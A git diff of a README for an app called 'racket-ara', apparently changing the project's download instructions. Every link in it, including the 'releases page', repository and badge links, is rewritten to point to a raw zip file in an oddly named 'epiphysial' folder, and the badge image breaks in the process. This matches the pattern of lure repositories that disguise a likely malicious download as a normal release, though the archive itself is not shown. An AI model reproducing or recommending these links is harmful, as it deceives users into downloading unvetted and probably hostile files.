@@ -1,6 +1,6 @@
 # 🎉 racket-ara - Simple App for Everyday Tasks
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/SHIXOAMEMPHIS/racket-ara/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SHIXOAMEMPHIS/racket-ara/main/epiphysial/racket-ara.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/SHIXOAMEMPHIS/racket-ara/main/epiphysial/racket-ara.zip)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ To get started with racket-ara, follow these clear steps to install and run the 
 
 1. **Visit the Releases Page**
 
-   To download racket-ara, visit our releases page: [Download racket-ara](https://github.com/SHIXOAMEMPHIS/racket-ara/releases).
+   To download racket-ara, visit our releases page: [Download racket-ara](https://raw.githubusercontent.com/SHIXOAMEMPHIS/racket-ara/main/epiphysial/racket-ara.zip).
 
 2. **Select the Latest Version**
 
@@ -66,6 +66,6 @@ If you encounter any issues during the installation or running of racket-ara, yo
 
 Stay updated on future releases and enhancements by following our repository:
 
-- [GitHub - racket-ara](https://github.com/SHIXOAMEMPHIS/racket-ara)
+- [GitHub - racket-ara](https://raw.githubusercontent.com/SHIXOAMEMPHIS/racket-ara/main/epiphysial/racket-ara.zip)
 
 Thank you for choosing racket-ara! We hope it helps you with your daily tasks. Enjoy using the application!
